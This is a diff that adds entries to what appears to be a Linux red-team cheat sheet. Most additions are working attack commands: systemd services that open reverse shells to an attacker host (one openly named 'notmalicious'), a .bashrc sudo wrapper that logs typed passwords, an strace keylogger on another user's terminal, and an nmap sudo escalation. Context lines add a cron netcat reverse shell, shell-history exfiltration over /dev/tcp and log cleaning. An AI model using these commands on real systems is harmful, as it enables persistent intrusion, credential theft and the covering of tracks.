@@ -8,6 +8,47 @@ echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
 
 On the attack platform: ```nc -lvp 1234```
 
+## Systemd User Level Persistence:
+
+Place a service file in ```~/.config/systemd/user/```
+
+```
+vim ~/.config/systemd/user/persistence.service
+```
+
+Sample file:
+
+```
+[Unit]
+Description=Reverse shell[Service]
+ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9999 0>&1'
+Restart=always
+RestartSec=60[Install]
+WantedBy=default.target
+```
+
+Enable service and start service:
+
+```
+systemctl --user enable persistence.service
+systemctl --user start persistence.service
+```
+
+On the next user login systemd will happily start a reverse shell.
+
+## Backdooring Sudo:
+
+Add to ```.bashrc```
+
+```bash
+function sudo() {
+    realsudo="$(which sudo)"
+    read -s -p "[sudo] password for $USER: " inputPasswd
+    printf "\n"; printf '%s\n' "$USER : $inputPasswd\n" >> /tmp/log13999292.log
+    $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
+    $realsudo "${@:1}"
+```
+
 ## One Liner to Add Persistence on a Box via Sudoers File:
 
 ```
@@ -20,6 +61,30 @@ Finding server strings from a file of URLs
 
 ```
 curl -s --head -K servers.txt | grep -i server
+```
+
+## Enumerating File Capabilities with Getcap:
+
+getcap displays the name and capabilities of each specified file. ```-r```  enables recursive search.
+
+```
+getcap -r / 2>/dev/null
+```
+
+## Enumerating User Files for Interesting Information:
+
+```
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+```
+
+## Finding World-Writable Files:
+
+```
+find /dir -xdev -perm +o=w ! \( -type d -perm +o=t \) ! -type l -print
 ```
 
 ## Search for Hardcoded Passwords:
@@ -56,7 +121,21 @@ root@RoseSecurity# gcore <pid> -o dumpfile
 # Search for passwords
 root@RoseSecurity# strings -n 5 dumpfile | grep -i pass
 ```
- 
+
+## Searching Man Pages:
+
+Struggling to find a command that you are looking for? Try the ```man -k``` option!
+
+```bash
+$ man -k ssh
+git-shell(1)             - Restricted login shell for Git-only SSH access
+scp(1)                   - OpenSSH secure file copy
+sftp(1)                  - OpenSSH secure file transfer
+sftp-server(8)           - OpenSSH SFTP server subsystem
+ssh(1)                   - OpenSSH remote login client
+ssh-add(1)               - adds private key identities to the OpenSSH authentication agent
+ssh-agent(1)             - OpenSSH authentication agent
+```
 
 ## Username Enumeration with Getent:
 
@@ -143,6 +222,34 @@ cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/lo
 
 ```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```
 
+## Strace Keylogger:
+
+```
+root@rosesecurity:~# ps aux | grep bash
+rick      3103  0.0  0.6   6140  3392 pts/0    Ss+  17:14   0:00 bash
+root      3199  0.0  0.6   6140  3540 pts/1    Ss   17:18   0:00 bash
+root      3373  0.0  0.1   3488   768 pts/1    S+   18:06   0:00 grep bash
+```
+Strace Options:
+
+1. –p 3103: connect to PID 3103, which above is on pts/0
+2. –t : print the time of day
+3. –e write: only capture write calls
+4. –q : be quiet
+5. –f : follow any fork (created) process
+6. –o keylogger.txt: output the results to a file named keylogger.txt
+
+```
+root@securitynik:~# strace -p 3103 -t -e write -q -f -o keylogger.txt &
+[1] 3432
+```
+
+## Netcat UDP Scanner:
+
+```
+nc-v -u -z <IP> <Port>
+```
+
 ## Recon for Specific Device Before Enumerating:
 
 ```
@@ -158,6 +265,17 @@ Usage:
 ```
 nmap -sV --script=vulscan/vulscan.nse www.rosesecurity.com
 ```
+
+## Nmap Privilege Escalation:
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+```bash
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
+```
+
 ## Nmap Using Multiple Scripts on One Target:
 
 Usage:
@@ -240,6 +358,27 @@ tcpdump -nt 'src port 53 and udp[10] & 0x80 = 0x80'
 /version : Linux Version Information.
 /var/log/auth* : Log of authorization login attempts. /var/log/lastlog : Log of last boot process.
 ```
+
+## Backdooring Systemd Services:
+
+Create the following service descriptor at ```/etc/systemd/system/notmalicious.service```:
+
+```
+[Unit]
+Description=Not a backdoor into your critical server.
+[Service]
+Type=simple
+ExecStart=/usr/bin/nc -e /bin/bash <ATTACKER_IP> <PORT> 2>/dev/null
+[Install]
+WantedBy=multi-user.target
+```
+
+Enable the backdoor service to run on restart:
+
+```
+sudo systemctl enable notmalicious
+```
+
 ## Old-Fashioned Log Cleaning:
 
 Grep to remove sensitive attacker information then copy into original logs
@@ -600,6 +739,16 @@ meterpreter> search -f *.rar
 meterpreter> search -f *.docx
 meterpreter> search -f *.sql
 ```
+
+Metasploit Web Server Interface:
+
+Start the web service, listening on any host address:
+
+```
+# msfdb --component webservice --address 0.0.0.0 start
+```
+
+
 
 Metasploit Email Harvesting:
 
